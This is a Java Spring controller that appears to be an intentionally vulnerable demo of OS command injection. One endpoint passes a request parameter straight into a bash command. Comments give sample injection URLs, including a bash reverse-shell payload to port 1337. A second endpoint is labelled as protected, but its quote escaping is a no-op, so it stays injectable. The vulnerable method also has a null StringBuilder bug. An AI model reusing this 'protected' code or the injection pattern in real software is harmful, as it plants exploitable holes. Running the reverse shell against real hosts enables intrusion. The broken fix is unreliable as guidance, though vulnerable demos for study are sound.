package com.safe.demo.hole.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

/**
 * 命令注入必须以cmd.exe或者/bin/bash开头，否者命令注入危害不大，本质原因是无法使用空格进行命令构造
 */
@RestController
@RequestMapping("/command")
public class CommandHole {

    @GetMapping("/get_host")
    public String result(HttpServletRequest request) {
        String host = request.getRemoteHost();
        return host;
    }

    /**
     * /command/exec_attack?cmd=. %26%26 pwd
     * <p>
     * /command/exec_attack?cmd=. %26%26 bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1337 <&1'
     */
    @GetMapping("/exec_attack")
    public static String exec_attack(String cmd) throws IOException, InterruptedException {
        Runtime runtime = Runtime.getRuntime();
        Process exec = runtime.exec(new String[]{"/bin/bash", "-c", "ls " + cmd});
        InputStream is = exec.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        StringBuilder content = null;
        while ((line = reader.readLine()) != null) {
            content.append(line + "\n");
        }

        exec.waitFor();
        is.close();
        reader.close();
        exec.destroy();
        return (content.toString()) == "" ? "no data" : content.toString();
    }


    /**
     * /command/exec_attack?cmd=. && pwd
     * /command/exec_attack?cmd=bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1337 <&1'
     */
    @GetMapping("/exec_protect")
    public static String exec_protect(String cmd) throws IOException, InterruptedException {
        Runtime runtime = Runtime.getRuntime();
        cmd = cmd.replace("'", "\'");
        cmd = cmd.replace("\"", "\\\"");
        Process exec = runtime.exec(new String[]{"/bin/bash", "-c", "ls " + "'" + cmd + "'"});
        InputStream is = exec.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        StringBuilder content = new StringBuilder();
        while ((line = reader.readLine()) != null) {
            content.append(line + "\n");
        }

        exec.waitFor();
        is.close();
        reader.close();
        exec.destroy();
        return (content.toString()) == "" ? "no data" : content.toString();
    }


    public static void main(String[] args) throws IOException, InterruptedException {
        Runtime runtime = Runtime.getRuntime();
        Process exec = runtime.exec("/bin/bash -c ls . && pwd");
        InputStream is = exec.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }

        exec.waitFor();
        is.close();
        reader.close();
        exec.destroy();
    }

}
